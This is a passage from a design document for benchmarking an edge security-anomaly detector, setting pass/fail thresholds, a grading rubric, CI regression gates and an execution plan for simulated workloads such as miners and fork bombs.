Target: < 1MB RSS for the detection pipeline (collector + predictor).

---

## 7. Evaluation Criteria

### 7.1 Pass/Fail Thresholds

| Metric | Target | Rationale |
|---|---|---|
| **TPR for high-confidence attacks** (A1: miner, A2: fork bomb) | > 95% (>28/30 trials) | These produce dramatic multi-domain anomalies that should be reliably detected |
| **TPR for compound-detectable attacks** (A5: wiper) | > 80% (>24/30 trials) | Requires compound rule; tolerates some misses |
| **TPR for weak-signal attacks** (A3: memory, A4: DNS, A6: escape) | > 60% compound, measured as baseline | These attacks may not produce sufficient infrastructure signal; the benchmark establishes the floor |
| **FPR for benign workloads** (B1-B4) | < 5% (<2/30 trials) for compound detector | Single workloads should not trigger security findings when compound rules are applied |
| **Sentinel-only FPR** | < 30% (measured, not a target) | Expected to be ~25% (B1 triggers); this is the before-improvement baseline |
| **MTTD for A1 (cryptominer)** | < 30 seconds | Miner CPU saturation is immediate; detection delay is the 10-sample warmup + statistical lag |
| **MTTD for A2 (fork bomb)** | < 15 seconds | Fork bombs produce extreme anomalies within seconds |
| **Pipeline latency (p99)** | < 10ms per prediction cycle | Sentinel's 100ms timeout (predictor.go line 77) is the ceiling; we want 10x margin |
| **Detector CPU overhead** | < 2% on 4-core ARM at 1 Hz | Per the budget in Section 6.3 |
| **Detector memory** | < 1 MB steady-state RSS | 1000-sample history + Welford accumulators |

### 7.2 Grading Rubric

| Grade | Criteria |
|---|---|
| **A (Ship it)** | All pass/fail thresholds met. TPR > 95% for high-confidence attacks, FPR < 5% for compound detector, MTTD < 30s, overhead < 2% CPU. |
| **B (Ship with caveats)** | TPR > 90% for high-confidence, FPR < 10%, MTTD < 60s. Document the gaps and propose tuning. |
| **C (Needs work)** | TPR > 80% for high-confidence OR FPR < 15%. The approach is viable but needs threshold tuning or additional compound rules. |
| **F (Rethink)** | TPR < 80% for high-confidence attacks OR FPR > 15%. The infrastructure-signal hypothesis does not hold with current architecture. |

### 7.3 Regression Gate

Once baseline numbers are established, integrate the benchmark corpus into CI:

- **Go**: `go test -run TestBenchmarkCorpusReplay ./pkg/healthscore/` runs on
  every PR to sentinel. Fails on TPR regression > 5% or FPR regression > 5%.
- **Rust**: `cargo test --features sentinel infrastructure_anomaly` runs on
  every PR to swarm-team-six. Fails on compound rule accuracy regression.
- **Performance**: `go test -bench BenchmarkPredictCPUOverhead` fails if
  ns/op increases by > 20% from established baseline.

---

## 8. Execution Plan

### Phase 1: Corpus Generation (1 week)

1. Write the synthetic /proc generator tool in Go (extends the mock /proc
   pattern from `collector_test.go` line 85).
2. Generate 30 trials x 10 workloads = 300 corpus files.
3. For live workloads (B1-B4, A1-A2, A5), record actual /proc snapshots from
   a Raspberry Pi 4B (4GB) running K3s. For A3, A4, A6, use synthetic
   generation from the formulas in Section 4.
4. Store corpus in `pkg/healthscore/testdata/benchmark/`.

### Phase 2: Harness Implementation (1 week)

1. Implement `benchmark_infra_test.go` (Section 3.2) in sentinel.
2. Implement `infrastructure_anomaly.rs` (Section 3.3) in swarm-whisker.
3. Implement `evaluate_benchmark.py` (Section 3.4).
4. Run initial calibration: verify expected baselines from Section 5 match
   actual predictor output within +/- 0.05.

### Phase 3: Benchmark Execution (3 days)

1. Run all 300 corpus files through both harnesses.
2. Collect results in JSON-lines format.
3. Run evaluation script. Report TPR/FPR/MTTD with confidence intervals.
4. Run performance benchmarks on target hardware (RPi 4B).

### Phase 4: Analysis and Tuning (1 week)

1. If FPR > 5%: tune compound rules, adjust K8s context gating.
2. If TPR < 95% for high-confidence: adjust thresholds or add new compound
   rules.
3. If MTTD > 30s: investigate warmup period, consider EWMA/CUSUM from
   Doc 02 Section 8.
4. Re-run Phase 3 with tuned parameters.
5. Establish CI regression baselines.

---

## Cross-References

| Document | Relevance |
|---|---|
| [02-PREDICTIVE-FAILURE-AS-THREAT-SIGNAL.md](02-PREDICTIVE-FAILURE-AS-THREAT-SIGNAL.md) | Design targets being validated (Section 12). Risk weight architecture (Section 4.3). Compound rules (Section 5.3). |
| [05-TELEMETRY-BRIDGE-ARCHITECTURE.md](05-TELEMETRY-BRIDGE-ARCHITECTURE.md) | Proposed TelemetryPayload variants. Bridge health contract. Collector analysis (Section 2). |
| [03-EDGE-NATIVE-SECURITY-DETECTION.md](03-EDGE-NATIVE-SECURITY-DETECTION.md) | Edge resource constraints that motivate the <2% overhead target. |
| Sentinel `pkg/collector/collector.go` | NodeMetrics struct, /proc parsing, WithProcPath test hook. |
| Sentinel `pkg/collector/collector_test.go` | Mock /proc pattern (TestCollectWithMockProc, line 85). BenchmarkCollect (line 271). |
| Sentinel `pkg/healthscore/predictor.go` | Risk weights (line 43), risk functions (lines 312-528), trend analysis (line 594), Welford's (line 152). |
| Sentinel `pkg/healthscore/predictor_test.go` | Existing test patterns for predictor validation. |
| Sentinel `test/integration/predictor_test.go` | Integration test pattern, performance test (line 74). |
| swarm-team-six `crates/swarm-core/src/telemetry.rs` | TelemetryEvent, TelemetryPayload, BridgeHealth, TelemetryBridge trait. |
| swarm-team-six `crates/swarm-core/src/pheromone.rs` | ThreatClass enum, PheromoneDeposit, PheromoneConcentration.exceeds_threshold(). |
| swarm-team-six `crates/swarm-whisker/src/detector.rs` | DetectionStrategy trait (line 17), DetectionFinding struct (line 26). |
| swarm-team-six `crates/swarm-whisker/src/dns_exfiltration.rs` | DnsExfiltrationDetector (entropy threshold, burst detection) -- validates A4 compound detection. |
| swarm-team-six `crates/swarm-whisker/src/composite.rs` | CompositeDetector fan-out pattern for multi-strategy evaluation. |
| swarm-team-six `crates/swarm-whisker/src/stream.rs` | evaluate_event(), findings_to_deposits() -- pipeline for converting findings to pheromones. |
